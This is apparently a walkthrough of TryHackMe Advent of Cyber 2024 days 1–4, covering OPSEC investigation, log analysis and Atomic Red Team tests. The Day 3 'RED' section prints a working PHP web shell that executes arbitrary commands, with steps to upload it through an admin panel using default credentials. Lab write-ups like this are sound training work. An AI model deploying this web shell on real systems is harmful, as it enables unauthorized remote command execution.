# 🎄 [Advent of Cyber 2024](https://tryhackme.com/r/room/adventofcyber2024)

## OPSEC - Day 1: Maybe SOC-mas music, he thought, doesn't come from a store?

**Operational Security (OPSEC)** is a set of principals and tactics used to attempt to protect the security of an operator or operation. An example of this may be using code names instead of your real names, or using a proxy to conceal your IP address.

**Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author?**

```shell
exiftool song.mp3 | grep Artist
```

**The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?**

```shell
curl -s https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1 | grep "c2Url ="
```

**Who is M.M? Maybe his Github profile page would provide clues?**

Go to https://github.com/MM-WarevilleTHM/M.M

**What is the number of commits on the GitHub repo where the issue was raised?**

Go to https://github.com/MM-WarevilleTHM/IS/commits/main/

**What's with all these GitHub repos? Could they hide something else?**

* https://github.com/MM-WarevilleTHM/M.M/commits/main/ has 5 commits
* Both repos have some forks
* Other than that, nothing `¯\_(ツ)_/¯`

## Log analysis - Day 2: One man's false positive is another man's potpourri

**What is the name of the account causing all the failed login attempts?**
**How many failed logon attempts were observed?**

* Select events between "November 29 0:00" and "December 1 23:30"
* Select fields `user.name`, `event.category` and `event.outcome`
* Search/Filter by `event.category = authentication AND event.outcome = failure`

**What is the IP address of Glitch?**

* On the previous search, add field `source.ip`
* Filter by different values of `source.ip` and select the one that caused the spike

**When did Glitch successfully logon to ADM-01?**

* On the previous search ...
* Search/Filter by `event.category = authentication AND event.outcome = success AND source.ip = <Glitch IP>`

**What is the decoded command executed by Glitch to fix the systems of Wareville?**

* Select fields `event.category` and `process.command_line`
* Search/Filter by `event.category = process`
* Check `powershell.exe` executions with a `-EncodedCommand` value
* Put that value in [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Decode_text('UTF-16LE%20(1200)')&input=U1FCdUFITUFkQUJoQUd3QWJBQXRBRmNBYVFCdUFHUUFid0IzQUhNQVZRQndBR1FBWVFCMEFHVUFJQUF0QUVFQVl3QmpBR1VBY0FCMEFFRUFiQUJzQUNBQUxRQkJBSFVBZEFCdkFGSUFaUUJpQUc4QWJ3QjBBQT09)

## Log analysis - Day 3: Even if I wanted to go, their vulnerabilities wouldn't allow it

**BLUE: Where was the web shell uploaded to?**
**BLUE: What IP address accessed the web shell?**

* Select index `frostypines-resorts`
* Select events between `Oct 3, 2024 @ 11:30:00.000` and `Oct 3, 2024 @ 12:00:00.000`
* Select fields `clientip` and `request`
* Search by `message: "shell.php"`
* Select the IP that executes suspicious commands (query parameter `command`)

**RED: What is the contents of the flag.txt?**

* Execute `sudo echo "10.101.200.8 frostypines.thm" >> /etc/hosts`
* Go to http://frostypines.thm/login.php with user=admin@frostypines.thm and password=admin
* Go to http://frostypines.thm/admin/add_room.php and create a new room uploading `shell.php` as its image:
  ```html
    <html>
        <body>
            <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
                <input type="text" name="command" autofocus id="command" size="50">
                <input type="submit" value="Execute">
            </form>
            <pre>
            <?php
                if(isset($_GET['command'])) 
                {
                    system($_GET['command'] . ' 2>&1'); 
                }
            ?>
            </pre>
        </body>
    </html>
  ```
* Go to http://frostypines.thm/media/images/rooms/shell.php?command=ls
* Go to http://frostypines.thm/media/images/rooms/shell.php?command=cat%20flag.txt

## Atomic Red Team - Day 4: I’m all atomic inside!

**What was the flag found in the .txt file that is found in the same directory as the PhishingAttachment.xslm artefact?**

```powershell
Invoke-AtomicTest T1566.001 -TestNumbers 1
cat C:\Users\Administrator\AppData\Local\Temp\PhishingAttachment.txt
Invoke-AtomicTest T1566.001-1 -cleanup
```

**What ATT&CK technique ID would be our point of interest?**

* https://attack.mitre.org/techniques/T1059/

**What ATT&CK subtechnique ID focuses on the Windows Command Shell?**

* https://attack.mitre.org/techniques/T1059/003/

**What is the name of the Atomic Test to be simulated?**

Search for a test named "ware":
```powershell
Invoke-AtomicTest T1059.003 -ShowDetailsBrief
```

**What is the name of the file used in the test?**

Search for a txt file:
```powershell
 Invoke-AtomicTest T1059.003 -ShowDetails -TestNumbers 4
```

**What is the flag found from this Atomic Test?**

Execute the test which should print a PDF containing the flag:
```powershell
Invoke-AtomicTest T1059.003 -TestNumbers 4
```
